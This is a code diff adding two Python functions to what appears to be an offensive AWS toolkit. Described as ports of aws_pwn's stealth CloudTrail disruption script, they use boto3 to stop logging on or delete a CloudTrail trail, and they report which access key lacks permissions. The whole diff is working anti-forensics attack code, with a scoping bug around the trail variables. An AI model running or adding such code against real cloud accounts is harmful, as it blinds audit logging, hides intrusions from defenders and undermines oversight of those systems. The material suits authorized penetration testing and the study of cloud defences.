@@ -91,3 +91,88 @@ def list_public_keys():
         print("CTRL-C received, exiting...")
 
 
+def stop_trail(TrailARN):
+    '''
+    port of https://github.com/dagrz/aws_pwn/blob/master/stealth/disrupt_cloudtrail.py
+    '''
+    print("### Attempting to stop trail {} ###\n".format(TrailARN[0]))
+    try:
+        for region in regions:
+            client = boto3.client('cloudtrail', region_name=region)
+
+            response = client.describe_trails()
+
+            # print(response)
+
+            if response['trailList'] is None:
+                print("{} likely does not have CloudTrail permissions\n" .format(AWS_ACCESS_KEY_ID))
+            elif len(response['trailList']) <= 0:
+                print("[-] ListTrails allowed for {} but no results [-]" .format(region))
+            else:
+                for trail in response['trailList']:
+                    HomeRegion = trail['HomeRegion']
+                    myTrailARN = TrailARN[0]
+                    # print(HomeRegion)
+                    # print(myTrailARN)
+        client2 = boto3.client('cloudtrail', region_name=HomeRegion)
+        response = client2.stop_logging(Name=myTrailARN)
+        print(response)
+        print("\n")
+    except botocore.exceptions.ClientError as e:
+        if e.response['Error']['Code'] == 'InvalidClientTokenId':
+            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
+        elif e.response['Error']['Code'] == 'AccessDenied':
+            print('{} : Does not have the required permissions' .format(AWS_ACCESS_KEY_ID))
+        #elif e.response['Error']['Code'] == 'UnrecognizedClientException':
+        #    print('{} : UnrecognizedClientException error' .format(AWS_ACCESS_KEY_ID))
+        #    pass
+        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
+            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
+        else:
+            print("Unexpected error: {}" .format(e))
+            pass
+    except KeyboardInterrupt:
+        print("CTRL-C received, exiting...")
+
+def delete_trail(TrailARN):
+    '''
+    port of https://github.com/dagrz/aws_pwn/blob/master/stealth/disrupt_cloudtrail.py
+    '''
+    print("### Attempting to delete trail {} ###\n".format(TrailARN[0]))
+    try:
+        for region in regions:
+            client = boto3.client('cloudtrail', region_name=region)
+
+            response = client.describe_trails()
+
+            # print(response)
+
+            if response['trailList'] is None:
+                print("{} likely does not have CloudTrail permissions\n" .format(AWS_ACCESS_KEY_ID))
+            elif len(response['trailList']) <= 0:
+                print("[-] ListTrails allowed for {} but no results [-]" .format(region))
+            else:
+                for trail in response['trailList']:
+                    HomeRegion = trail['HomeRegion']
+                    myTrailARN = TrailARN[0]
+                    # print(HomeRegion)
+                    # print(myTrailARN)
+        client2 = boto3.client('cloudtrail', region_name=HomeRegion)
+        response = client2.delete_trail(Name=myTrailARN)
+        print(response)
+        print("\n")
+    except botocore.exceptions.ClientError as e:
+        if e.response['Error']['Code'] == 'InvalidClientTokenId':
+            sys.exit("{} : The AWS KEY IS INVALID. Exiting" .format(AWS_ACCESS_KEY_ID))
+        elif e.response['Error']['Code'] == 'AccessDenied':
+            print('{} : Does not have the required permissions' .format(AWS_ACCESS_KEY_ID))
+        #elif e.response['Error']['Code'] == 'UnrecognizedClientException':
+        #    print('{} : UnrecognizedClientException error' .format(AWS_ACCESS_KEY_ID))
+        #    pass
+        elif e.response['Error']['Code'] == 'SubscriptionRequiredException':
+            print('{} : Has permissions but isnt signed up for service - usually means you have a root account' .format(AWS_ACCESS_KEY_ID))
+        else:
+            print("Unexpected error: {}" .format(e))
+            pass
+    except KeyboardInterrupt:
+        print("CTRL-C received, exiting...")
